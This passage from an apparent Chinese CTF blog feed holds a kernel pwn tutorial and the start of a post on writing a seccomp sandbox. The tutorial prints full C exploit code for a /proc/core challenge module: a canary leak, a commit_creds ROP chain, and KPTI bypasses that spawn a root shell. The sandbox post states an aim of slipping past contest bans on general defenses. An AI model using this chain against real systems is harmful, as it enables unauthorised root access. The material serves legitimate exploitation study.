                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161655713.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161831159.png"
                      class=""
                >
<p>绕过smep，成功提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301170816953.png"
                      class=""
                >
<p>但实际上现代内核中通常会采用“CR4钉住”（CR4
pinning）的机制，使得即使你尝试修改这些位（包括SMAP和SMEP相关位），内核会自动恢复它们的固定状态，从而防止这种简单的修改。所以现在ret2usr这种利用手法已经几乎失效了，一般只能走内核ROP，比如用后述kpti得绕过方法。</p>
<h4 id="kpti保护绕过">kpti保护绕过</h4>
<p>KPTI（Kernel Page-Table Isolation，内核页表隔离）是一种
<strong>安全防御机制</strong>，用于
<strong>防止内核地址泄露</strong>，主要是为了 <strong>缓解 Meltdown
漏洞</strong>（CVE-2017-5754）。</p>
<p>在 <strong>启用 KPTI</strong> 的系统上：</p>
<ul>
<li>用户态运行时，<strong>完全隔离</strong>
内核的页表，防止用户态进程访问或推测出内核地址。</li>
<li>只有在 <strong>发生系统调用（syscall）、中断或异常</strong> 时，才会
<strong>切换到内核页表</strong> 进行内核代码执行。</li>
</ul>
<p>在 <strong>未启用 KPTI</strong> 的情况下，<code>CR3</code>
指向的页表包含 <strong>用户态和内核态的地址映射</strong>。
<strong>问题</strong>：Meltdown 攻击可以利用 CPU 的
<strong>推测执行漏洞</strong>，从用户态<strong>读取</strong>本应受保护的
<strong>内核地址</strong>！</p>
<p><strong>KPTI 通过修改 <code>CR3</code> 来隔离页表：</strong></p>
<ul>
<li>用户态执行时：<code>CR3</code> 只加载
<strong>用户页表</strong>（不包含内核页表）。</li>
<li>进入内核态时（如 <code>syscall</code>）：<code>CR3</code> 切换到
<strong>完整页表</strong>（包含用户和内核页表）。</li>
</ul>
<p>KPTI保护机制的绕过主要包括异常处理以及页表切换两种绕过利用手法，到了kpti这种保护时其实我们的ret2usr手法已经不能生效了，需要构建内核ROP并绕过限制，我们还是以上面的题目为例，启动脚本加上<code>kpti=1</code>来启用页表隔离，注意这里cpu参数中用的是kvm64模型（这个模型默认kpti是开启的，这里手动指定方便查看），之前的qemu64-v1会启动不了kpti。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr kpti=1&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure></div>
<h5 id="异常处理">异常处理</h5>
<p>首先我们来看看如果不用异常处理，而是直接ROP着陆用户态执行用户代码，那么最后会爆<strong>Segmentation
fault</strong>。这是因为在 KPTI 启用的情况下，用户态和内核态的
<code>CR3</code> <strong>必须</strong>正确切换，否则CPU
<strong>仍然使用内核页表访问用户态地址</strong>，就会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301205945326.png"
                      class=""
                >
<p>所以主要思路是捕获<code>Segmentation fault</code>的异常，在异常处理中调用<code>system(/bin/sh)</code>。这种方式能成功地关键在于内核ROP时其实已经成功把当前进程的cred换成了具有root权限的cred。之后靠异常处理就能获得到root权限的shell。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc kpti_bypass.c -static -masm=intel -g -o kpti_bypass</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            </span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301211900339.png"
                      class=""
                >
<h5 id="页表切换">页表切换</h5>
<p>借鉴之前改cr4寄存器实现绕过smep的方式，这里我们可以通过操作cr3寄存器实现kpti的绕过。这种方式用的是<strong>swapgs_restore_regs_and_return_to_usermode</strong>函数，这个函数是
<strong>Linux 内核</strong> 在 <strong>从内核态返回用户态</strong>
时使用的一个关键函数，它主要用于 <strong>处理 KPTI（Kernel Page Table
Isolation）</strong> 以及 <strong>恢复用户态寄存器</strong>。</p>
<p>该函数的内部存在修改<code>CR3</code>的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表。这里有个小trick，就是能够从该函数偏移0x16处开始执行，因为前面是一排弹栈操作，十分吃ROP空间，而且对后面影响不大。最后注意调用该函数+0x16时，最后还会从栈上弹两个地址，需要我们填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220750057.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220932948.png"
                      class=""
                >
<p>最后就能成功进入我们的shell中</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301221120036.png"
                      class=""
                >
<p>获取地址偏移方式如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301213354984.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ROP</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">// rop[i++] = 0;</span></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a008da</span> + offset + <span class="number">0x16</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="smap保护绕过">smap保护绕过</h4>
<p>SMAP，全称 <strong>Supervisor Mode Access
Prevention</strong>，是一种硬件安全机制，主要用于防止内核意外或恶意地访问用户空间内存。</p>
<p>此时使用<code>swapgs_restore_regs_and_return_to_usermode</code>函数也是完全可以绕过的，因此可以直接使用它构建<code>ROP</code>链。</p>
<p>若rop长度不够需要栈迁移，则需要更加精巧的手段，我们放到以后学习。</p>
<h4 id="kaslr保护绕过">kaslr保护绕过</h4>
<p>与正常pwn题的aslr绕过类似，需要找到漏洞点泄露地址，进而算出基址，与用户态下的利用没有区别。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>self-made sandbox</title>
    <url>/blog/2024/09/21/self-made-sandbox/</url>
    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
<h3 id="一c代码实现沙箱">一、c代码实现沙箱</h3>
<p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">// 读取系统调用号</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否为 execve 系统调用（编号 59）</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 execve，则杀死进程</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 允许其他系统调用</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用 seccomp 过滤模式</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    install_seccomp();</span><br><span class="line">    <span class="comment">// 你可以在这里运行原来的程序逻辑</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个 <code>install_seccomp()</code> 函数的作用是通过
<code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用
<code>execve</code> 系统调用。如果程序尝试调用
<code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
<p>以下是其中每个部分的功能和用法的详细解释：</p>
<h4 id="struct-sock_filter-filter">struct sock_filter filter[]</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>这是一个 BPF（Berkeley Packet
Filter）过滤器指令数组，用来定义程序的过滤规则。每一条
<code>sock_filter</code> 定义了一条 BPF
指令，用来判断并处理系统调用。</p>
<p><strong>第一条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr))</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code>
结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
<li><code>offsetof(struct seccomp_data, nr)</code> 是
<code>seccomp_data</code> 结构体中 <code>nr</code>
成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
</ul>
<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是
<code>execve</code> 系统调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nr;        <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;    <span class="comment">// 架构信息</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 指令指针</span></span><br><span class="line">    __u64 args[<span class="number">6</span>]; <span class="comment">// 系统调用参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct
seccomp_data, nr)也可以写为0。</p>
<p><strong>第二条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>BPF_JMP</code> 指令执行跳转。</li>
<li><code>BPF_JEQ</code>
是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
</ul>
<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code>
的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
<p><strong>第三条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>BPF_RET</code> 表示返回结果。</li>
<li><code>BPF_K</code> 表示一个立即数操作，这里为
<code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到
<code>execve</code> 系统调用时杀死进程。</li>
</ul>
<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
<p><strong>第四条指令</strong></p>
